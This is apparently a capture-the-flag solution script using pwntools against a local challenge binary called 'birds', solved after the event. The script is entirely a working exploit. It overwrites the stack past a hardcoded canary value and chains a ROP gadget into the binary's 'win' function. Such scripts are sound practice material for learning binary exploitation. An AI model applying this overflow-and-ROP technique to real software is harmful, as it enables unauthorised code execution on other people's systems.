# the challenge was solved locally after the event.
from pwn import *

elf = ELF('./birds')
p = process(elf.path)
offset = 76 # using ghidra , cylic wont work because the hardcoded canary prevents the bof
pop_rdi_nop_pop_rbp = 0x4011c0 # Using ROPgadget

payload = flat(
    b'A' * offset,
    p64(0xDEADBEEF),
    asm('nop') * 4,
    p64(pop_rdi_nop_pop_rbp),
    p64(0xA1B2C3D4),
    p64(0x0),
    p64(elf.symbols['win']), 
    p64(0x0)  
)

write('payload', payload)
p.sendline(payload)
p.interactive()
